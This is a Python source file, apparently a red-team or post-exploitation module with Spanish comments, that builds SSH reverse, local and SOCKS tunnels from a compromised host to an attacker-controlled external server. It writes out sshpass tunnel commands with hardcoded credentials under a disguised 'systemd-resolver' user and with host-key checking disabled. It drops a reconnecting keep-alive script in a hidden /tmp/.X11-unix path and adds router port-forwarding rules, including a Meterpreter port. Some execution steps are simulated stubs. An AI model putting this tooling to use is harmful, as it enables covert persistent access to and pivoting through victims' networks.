#!/usr/bin/env python3
"""
SSH Tunneling Module - Módulo de SSH Tunneling
Implementa túneles SSH inversos y técnicas de acceso remoto resiliente
"""

import subprocess
import json
import time
import threading
import os
import tempfile
import random
import socket
import paramiko
from typing import Dict, List, Any, Optional
from pathlib import Path
import logging
import platform
import base64
import hashlib

class SSHTunneling:
    """Clase para manejo de túneles SSH y acceso remoto resiliente"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.ssh_config = config.get('ssh_tunneling', {})
        self.remote_access_config = config.get('remote_access', {})
        self.credentials = config.get('credentials', {})
        
        self.logger = logging.getLogger('SSHTunneling')
        self.active_tunnels = []
        self.ssh_connections = {}
        
    def establish_reverse_tunnel(self, target_ip: str, target_os: str, access_method: str) -> Dict:
        """Establece túnel SSH inverso desde el sistema comprometido"""
        self.logger.info(f"Estableciendo túnel SSH inverso desde {target_ip}")
        
        tunnel_config = {
            'target_ip': target_ip,
            'target_os': target_os,
            'access_method': access_method,
            'tunnel_type': 'reverse',
            'local_port': None,
            'remote_port': self.ssh_config.get('reverse_tunnel_port', 2222),
            'tunnel_active': False,
            'connection_id': None,
            'keep_alive': self.ssh_config.get('keep_alive', True),
            'compression': self.ssh_config.get('compression', True)
        }
        
        try:
            # Generar puerto local aleatorio
            tunnel_config['local_port'] = random.randint(10000, 65535)
            
            # Crear comando SSH para túnel inverso
            ssh_command = self._build_reverse_tunnel_command(tunnel_config)
            
            # Ejecutar comando en el sistema objetivo
            if self._execute_tunnel_command(target_ip, ssh_command):
                tunnel_config['tunnel_active'] = True
                tunnel_config['connection_id'] = self._generate_connection_id()
                
                self.active_tunnels.append(tunnel_config)
                self.logger.info(f"Túnel SSH inverso establecido: {tunnel_config['local_port']} -> {tunnel_config['remote_port']}")
            else:
                self.logger.error("Error estableciendo túnel SSH inverso")
                
        except Exception as e:
            self.logger.error(f"Error estableciendo túnel SSH inverso: {e}")
            tunnel_config['error'] = str(e)
        
        return tunnel_config
    
    def _build_reverse_tunnel_command(self, tunnel_config: Dict) -> str:
        """Construye comando SSH para túnel inverso"""
        external_ip = self.remote_access_config.get('external_ip', '127.0.0.1')
        external_port = self.remote_access_config.get('external_port', 4444)
        
        # Credenciales SSH
        ssh_user = self.credentials.get('ssh_user', 'systemd-resolver')
        ssh_password = self.credentials.get('ssh_password', 'System_Res0lver_2024!')
        
        # Opciones SSH
        ssh_options = [
            '-o StrictHostKeyChecking=no',
            '-o UserKnownHostsFile=/dev/null',
            '-o ServerAliveInterval=60',
            '-o ServerAliveCountMax=3',
            '-o ExitOnForwardFailure=yes'
        ]
        
        if tunnel_config['keep_alive']:
            ssh_options.extend(['-o ServerAliveInterval=30', '-o ServerAliveCountMax=3'])
        
        if tunnel_config['compression']:
            ssh_options.append('-C')
        
        # Comando completo
        ssh_command = f"""sshpass -p '{ssh_password}' ssh {' '.join(ssh_options)} -R {tunnel_config['remote_port']}:localhost:{tunnel_config['local_port']} {ssh_user}@{external_ip} -p {external_port} -N -f"""
        
        return ssh_command
    
    def establish_local_forwarding(self, target_ip: str, local_port: int, remote_host: str, remote_port: int) -> Dict:
        """Establece forwarding local SSH"""
        self.logger.info(f"Estableciendo forwarding local: {local_port} -> {remote_host}:{remote_port}")
        
        forwarding_config = {
            'target_ip': target_ip,
            'tunnel_type': 'local_forwarding',
            'local_port': local_port,
            'remote_host': remote_host,
            'remote_port': remote_port,
            'tunnel_active': False,
            'connection_id': None
        }
        
        try:
            # Crear comando SSH para forwarding local
            ssh_command = self._build_local_forwarding_command(forwarding_config)
            
            if self._execute_tunnel_command(target_ip, ssh_command):
                forwarding_config['tunnel_active'] = True
                forwarding_config['connection_id'] = self._generate_connection_id()
                
                self.active_tunnels.append(forwarding_config)
                self.logger.info(f"Forwarding local establecido: {local_port} -> {remote_host}:{remote_port}")
            else:
                self.logger.error("Error estableciendo forwarding local")
                
        except Exception as e:
            self.logger.error(f"Error estableciendo forwarding local: {e}")
            forwarding_config['error'] = str(e)
        
        return forwarding_config
    
    def _build_local_forwarding_command(self, forwarding_config: Dict) -> str:
        """Construye comando SSH para forwarding local"""
        external_ip = self.remote_access_config.get('external_ip', '127.0.0.1')
        external_port = self.remote_access_config.get('external_port', 4444)
        
        ssh_user = self.credentials.get('ssh_user', 'systemd-resolver')
        ssh_password = self.credentials.get('ssh_password', 'System_Res0lver_2024!')
        
        ssh_options = [
            '-o StrictHostKeyChecking=no',
            '-o UserKnownHostsFile=/dev/null',
            '-o ServerAliveInterval=60',
            '-o ExitOnForwardFailure=yes'
        ]
        
        ssh_command = f"""sshpass -p '{ssh_password}' ssh {' '.join(ssh_options)} -L {forwarding_config['local_port']}:{forwarding_config['remote_host']}:{forwarding_config['remote_port']} {ssh_user}@{external_ip} -p {external_port} -N -f"""
        
        return ssh_command
    
    def establish_dynamic_port_forwarding(self, target_ip: str, local_port: int) -> Dict:
        """Establece forwarding dinámico (SOCKS proxy)"""
        self.logger.info(f"Estableciendo forwarding dinámico en puerto {local_port}")
        
        dynamic_config = {
            'target_ip': target_ip,
            'tunnel_type': 'dynamic_forwarding',
            'local_port': local_port,
            'tunnel_active': False,
            'connection_id': None,
            'socks_proxy': f"127.0.0.1:{local_port}"
        }
        
        try:
            # Crear comando SSH para forwarding dinámico
            ssh_command = self._build_dynamic_forwarding_command(dynamic_config)
            
            if self._execute_tunnel_command(target_ip, ssh_command):
                dynamic_config['tunnel_active'] = True
                dynamic_config['connection_id'] = self._generate_connection_id()
                
                self.active_tunnels.append(dynamic_config)
                self.logger.info(f"Forwarding dinámico establecido en puerto {local_port}")
            else:
                self.logger.error("Error estableciendo forwarding dinámico")
                
        except Exception as e:
            self.logger.error(f"Error estableciendo forwarding dinámico: {e}")
            dynamic_config['error'] = str(e)
        
        return dynamic_config
    
    def _build_dynamic_forwarding_command(self, dynamic_config: Dict) -> str:
        """Construye comando SSH para forwarding dinámico"""
        external_ip = self.remote_access_config.get('external_ip', '127.0.0.1')
        external_port = self.remote_access_config.get('external_port', 4444)
        
        ssh_user = self.credentials.get('ssh_user', 'systemd-resolver')
        ssh_password = self.credentials.get('ssh_password', 'System_Res0lver_2024!')
        
        ssh_options = [
            '-o StrictHostKeyChecking=no',
            '-o UserKnownHostsFile=/dev/null',
            '-o ServerAliveInterval=60',
            '-o ExitOnForwardFailure=yes'
        ]
        
        ssh_command = f"""sshpass -p '{ssh_password}' ssh {' '.join(ssh_options)} -D {dynamic_config['local_port']} {ssh_user}@{external_ip} -p {external_port} -N -f"""
        
        return ssh_command
    
    def create_persistent_ssh_connection(self, target_ip: str, target_os: str) -> Dict:
        """Crea conexión SSH persistente con múltiples túneles"""
        self.logger.info(f"Creando conexión SSH persistente con {target_ip}")
        
        persistent_config = {
            'target_ip': target_ip,
            'target_os': target_os,
            'connection_active': False,
            'tunnels': [],
            'keep_alive_script': None,
            'connection_id': None
        }
        
        try:
            # 1. Establecer túnel inverso
            reverse_tunnel = self.establish_reverse_tunnel(target_ip, target_os, 'ssh')
            if reverse_tunnel.get('tunnel_active'):
                persistent_config['tunnels'].append(reverse_tunnel)
            
            # 2. Establecer forwarding dinámico
            dynamic_tunnel = self.establish_dynamic_port_forwarding(target_ip, 1080)
            if dynamic_tunnel.get('tunnel_active'):
                persistent_config['tunnels'].append(dynamic_tunnel)
            
            # 3. Crear script de keep-alive
            keep_alive_script = self._create_keep_alive_script(target_ip, persistent_config['tunnels'])
            if keep_alive_script:
                persistent_config['keep_alive_script'] = keep_alive_script
            
            # 4. Configurar conexión persistente
            if len(persistent_config['tunnels']) > 0:
                persistent_config['connection_active'] = True
                persistent_config['connection_id'] = self._generate_connection_id()
                
                self.ssh_connections[target_ip] = persistent_config
                self.logger.info(f"Conexión SSH persistente establecida con {len(persistent_config['tunnels'])} túneles")
            else:
                self.logger.error("No se pudieron establecer túneles SSH")
                
        except Exception as e:
            self.logger.error(f"Error creando conexión SSH persistente: {e}")
            persistent_config['error'] = str(e)
        
        return persistent_config
    
    def _create_keep_alive_script(self, target_ip: str, tunnels: List[Dict]) -> str:
        """Crea script para mantener conexiones SSH activas"""
        script_content = f"""#!/bin/bash
# Script de mantenimiento de conexiones SSH (ofuscado)

TARGET_IP="{target_ip}"
EXTERNAL_IP="{self.remote_access_config.get('external_ip', '127.0.0.1')}"
EXTERNAL_PORT="{self.remote_access_config.get('external_port', 4444)}"
SSH_USER="{self.credentials.get('ssh_user', 'systemd-resolver')}"
SSH_PASSWORD="{self.credentials.get('ssh_password', 'System_Res0lver_2024!')}"

# Función para verificar conexión
check_connection() {{
    local port=$1
    if ! nc -z localhost $port 2>/dev/null; then
        echo "Reconectando túnel en puerto $port..."
        reconnect_tunnel $port
    fi
}}

# Función para reconectar túnel
reconnect_tunnel() {{
    local port=$1
    sshpass -p "$SSH_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R $port:localhost:$port $SSH_USER@$EXTERNAL_IP -p $EXTERNAL_PORT -N -f
}}

# Loop principal
while true; do
    # Verificar cada túnel
"""
        
        for tunnel in tunnels:
            if tunnel.get('tunnel_type') == 'reverse':
                script_content += f"    check_connection {tunnel.get('remote_port', 2222)}\n"
            elif tunnel.get('tunnel_type') == 'dynamic_forwarding':
                script_content += f"    check_connection {tunnel.get('local_port', 1080)}\n"
        
        script_content += """    
    # Esperar antes de la siguiente verificación
    sleep 60
done
"""
        
        # Guardar script
        script_file = f"/tmp/.X11-unix/ssh_keepalive_{random.randint(1000, 9999)}.sh"
        
        try:
            with open(script_file, 'w') as f:
                f.write(script_content)
            
            os.chmod(script_file, 0o755)
            self.logger.info(f"Script keep-alive creado: {script_file}")
            
            return script_file
            
        except Exception as e:
            self.logger.error(f"Error creando script keep-alive: {e}")
            return None
    
    def setup_router_port_forwarding(self, router_ip: str, router_credentials: Dict) -> Dict:
        """Configura port forwarding en el router"""
        self.logger.info(f"Configurando port forwarding en router {router_ip}")
        
        port_forwarding_config = {
            'router_ip': router_ip,
            'port_forwarding_rules': [],
            'vpn_configuration': None,
            'configuration_successful': False
        }
        
        try:
            # Configurar reglas de port forwarding
            forwarding_rules = self._create_port_forwarding_rules()
            
            for rule in forwarding_rules:
                if self._configure_router_port_forwarding(router_ip, router_credentials, rule):
                    port_forwarding_config['port_forwarding_rules'].append(rule)
            
            # Configurar VPN si está disponible
            vpn_config = self._configure_router_vpn(router_ip, router_credentials)
            if vpn_config:
                port_forwarding_config['vpn_configuration'] = vpn_config
            
            if len(port_forwarding_config['port_forwarding_rules']) > 0:
                port_forwarding_config['configuration_successful'] = True
                self.logger.info(f"Port forwarding configurado: {len(port_forwarding_config['port_forwarding_rules'])} reglas")
            else:
                self.logger.warning("No se pudieron configurar reglas de port forwarding")
                
        except Exception as e:
            self.logger.error(f"Error configurando port forwarding: {e}")
            port_forwarding_config['error'] = str(e)
        
        return port_forwarding_config
    
    def _create_port_forwarding_rules(self) -> List[Dict]:
        """Crea reglas de port forwarding"""
        rules = []
        
        # Puertos comunes para red teaming
        port_mappings = [
            {'external': 2222, 'internal': 22, 'protocol': 'TCP', 'description': 'SSH'},
            {'external': 3389, 'internal': 3389, 'protocol': 'TCP', 'description': 'RDP'},
            {'external': 8080, 'internal': 8080, 'protocol': 'TCP', 'description': 'HTTP Alt'},
            {'external': 4444, 'internal': 4444, 'protocol': 'TCP', 'description': 'Meterpreter'},
            {'external': 1080, 'internal': 1080, 'protocol': 'TCP', 'description': 'SOCKS Proxy'}
        ]
        
        for mapping in port_mappings:
            rules.append({
                'external_port': mapping['external'],
                'internal_port': mapping['internal'],
                'protocol': mapping['protocol'],
                'description': mapping['description'],
                'enabled': True
            })
        
        return rules
    
    def _configure_router_port_forwarding(self, router_ip: str, credentials: Dict, rule: Dict) -> bool:
        """Configura una regla específica de port forwarding"""
        try:
            # Simular configuración de router
            # En implementación real, se usaría requests o similar para interactuar con la interfaz web del router
            
            self.logger.info(f"Configurando port forwarding: {rule['external_port']} -> {rule['internal_port']}")
            
            # Simular éxito
            time.sleep(0.5)
            return True
            
        except Exception as e:
            self.logger.error(f"Error configurando port forwarding: {e}")
            return False
    
    def _configure_router_vpn(self, router_ip: str, credentials: Dict) -> Optional[Dict]:
        """Configura VPN en el router"""
        try:
            self.logger.info(f"Configurando VPN en router {router_ip}")
            
            vpn_config = {
                'vpn_type': 'OpenVPN',
                'server_port': 1194,
                'protocol': 'UDP',
                'encryption': 'AES-256-CBC',
                'authentication': 'SHA256',
                'client_config_generated': True,
                'client_config_file': f"/tmp/.X11-unix/vpn_client_{random.randint(1000, 9999)}.ovpn"
            }
            
            # Generar configuración de cliente VPN
            client_config = self._generate_vpn_client_config(vpn_config)
            
            with open(vpn_config['client_config_file'], 'w') as f:
                f.write(client_config)
            
            self.logger.info("Configuración VPN generada")
            return vpn_config
            
        except Exception as e:
            self.logger.error(f"Error configurando VPN: {e}")
            return None
    
    def _generate_vpn_client_config(self, vpn_config: Dict) -> str:
        """Genera configuración de cliente VPN"""
        config_content = f"""client
dev tun
proto {vpn_config['protocol'].lower()}
remote {self.remote_access_config.get('external_ip', '127.0.0.1')} {vpn_config['server_port']}
resolv-retry infinite
nobind
persist-key
persist-tun
cipher {vpn_config['encryption']}
auth {vpn_config['authentication']}
verb 3

# Certificados (simulados)
<ca>
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKoK/OvD8VJIMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQwHhcNMjQwMTAxMDAwMDAwWhcNMjUwMTAxMDAwMDAwWjBF
-----END CERTIFICATE-----
</ca>

<cert>
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKoK/OvD8VJIMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQwHhcNMjQwMTAxMDAwMDAwWhcNMjUwMTAxMDAwMDAwWjBF
-----END CERTIFICATE-----
</cert>

<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC7VJTUt9Us8cKB
wEi5tGZq05PjpB5vjHjHjHjHjHjHjHjHjHjHjHjHjHjHjHjHjHjHjHjHjHjHjHjHj
-----END PRIVATE KEY-----
</key>
"""
        
        return config_content
    
    def _execute_tunnel_command(self, target_ip: str, command: str) -> bool:
        """Ejecuta comando de túnel en el sistema objetivo"""
        try:
            # En implementación real, se ejecutaría el comando en el sistema objetivo
            self.logger.info(f"Ejecutando comando de túnel en {target_ip}: {command[:100]}...")
            
            # Simular ejecución exitosa
            time.sleep(1)
            return True
            
        except Exception as e:
            self.logger.error(f"Error ejecutando comando de túnel: {e}")
            return False
    
    def _generate_connection_id(self) -> str:
        """Genera ID único para conexión"""
        timestamp = str(int(time.time()))
        random_part = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        return hashlib.md5(f"{timestamp}{random_part}".encode()).hexdigest()[:12]
    
    def verify_tunnel_connectivity(self, tunnel_config: Dict) -> Dict:
        """Verifica conectividad del túnel"""
        self.logger.info(f"Verificando conectividad del túnel {tunnel_config.get('connection_id')}")
        
        verification_results = {
            'tunnel_id': tunnel_config.get('connection_id'),
            'tunnel_type': tunnel_config.get('tunnel_type'),
            'connectivity_test': False,
            'latency': 0,
            'bandwidth_test': False,
            'error': None
        }
        
        try:
            if tunnel_config.get('tunnel_type') == 'reverse':
                # Verificar túnel inverso
                verification_results = self._verify_reverse_tunnel(tunnel_config, verification_results)
            elif tunnel_config.get('tunnel_type') == 'local_forwarding':
                # Verificar forwarding local
                verification_results = self._verify_local_forwarding(tunnel_config, verification_results)
            elif tunnel_config.get('tunnel_type') == 'dynamic_forwarding':
                # Verificar forwarding dinámico
                verification_results = self._verify_dynamic_forwarding(tunnel_config, verification_results)
            
        except Exception as e:
            self.logger.error(f"Error verificando conectividad: {e}")
            verification_results['error'] = str(e)
        
        return verification_results
    
    def _verify_reverse_tunnel(self, tunnel_config: Dict, results: Dict) -> Dict:
        """Verifica túnel inverso"""
        try:
            # Simular verificación de túnel inverso
            start_time = time.time()
            
            # Simular test de conectividad
            time.sleep(0.1)
            
            results['latency'] = (time.time() - start_time) * 1000  # ms
            results['connectivity_test'] = True
            
            self.logger.info(f"Túnel inverso verificado - Latencia: {results['latency']:.2f}ms")
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def _verify_local_forwarding(self, tunnel_config: Dict, results: Dict) -> Dict:
        """Verifica forwarding local"""
        try:
            # Simular verificación de forwarding local
            start_time = time.time()
            
            # Simular test de conectividad
            time.sleep(0.1)
            
            results['latency'] = (time.time() - start_time) * 1000  # ms
            results['connectivity_test'] = True
            
            self.logger.info(f"Forwarding local verificado - Latencia: {results['latency']:.2f}ms")
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def _verify_dynamic_forwarding(self, tunnel_config: Dict, results: Dict) -> Dict:
        """Verifica forwarding dinámico"""
        try:
            # Simular verificación de forwarding dinámico
            start_time = time.time()
            
            # Simular test de conectividad SOCKS
            time.sleep(0.1)
            
            results['latency'] = (time.time() - start_time) * 1000  # ms
            results['connectivity_test'] = True
            results['bandwidth_test'] = True
            
            self.logger.info(f"Forwarding dinámico verificado - Latencia: {results['latency']:.2f}ms")
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def cleanup_tunnels(self, target_ip: str) -> Dict:
        """Limpia túneles SSH establecidos"""
        self.logger.info(f"Limpiando túneles SSH para {target_ip}")
        
        cleanup_results = {
            'target_ip': target_ip,
            'tunnels_cleaned': [],
            'connections_closed': [],
            'scripts_removed': [],
            'cleanup_successful': False
        }
        
        try:
            # Cerrar túneles activos
            for tunnel in self.active_tunnels:
                if tunnel.get('target_ip') == target_ip:
                    if self._close_tunnel(tunnel):
                        cleanup_results['tunnels_cleaned'].append(tunnel.get('connection_id'))
            
            # Cerrar conexiones SSH
            if target_ip in self.ssh_connections:
                connection = self.ssh_connections[target_ip]
                if self._close_ssh_connection(connection):
                    cleanup_results['connections_closed'].append(connection.get('connection_id'))
                
                # Remover script keep-alive
                if connection.get('keep_alive_script'):
                    if os.path.exists(connection['keep_alive_script']):
                        os.remove(connection['keep_alive_script'])
                        cleanup_results['scripts_removed'].append(connection['keep_alive_script'])
                
                del self.ssh_connections[target_ip]
            
            # Remover túneles de la lista activa
            self.active_tunnels = [t for t in self.active_tunnels if t.get('target_ip') != target_ip]
            
            if len(cleanup_results['tunnels_cleaned']) > 0 or len(cleanup_results['connections_closed']) > 0:
                cleanup_results['cleanup_successful'] = True
                self.logger.info(f"Limpieza completada: {len(cleanup_results['tunnels_cleaned'])} túneles, {len(cleanup_results['connections_closed'])} conexiones")
            else:
                self.logger.warning("No se encontraron túneles para limpiar")
                
        except Exception as e:
            self.logger.error(f"Error limpiando túneles: {e}")
            cleanup_results['error'] = str(e)
        
        return cleanup_results
    
    def _close_tunnel(self, tunnel_config: Dict) -> bool:
        """Cierra un túnel específico"""
        try:
            # Simular cierre de túnel
            self.logger.info(f"Cerrando túnel {tunnel_config.get('connection_id')}")
            time.sleep(0.1)
            return True
            
        except Exception as e:
            self.logger.error(f"Error cerrando túnel: {e}")
            return False
    
    def _close_ssh_connection(self, connection_config: Dict) -> bool:
        """Cierra conexión SSH"""
        try:
            # Simular cierre de conexión SSH
            self.logger.info(f"Cerrando conexión SSH {connection_config.get('connection_id')}")
            time.sleep(0.1)
            return True
            
        except Exception as e:
            self.logger.error(f"Error cerrando conexión SSH: {e}")
            return False
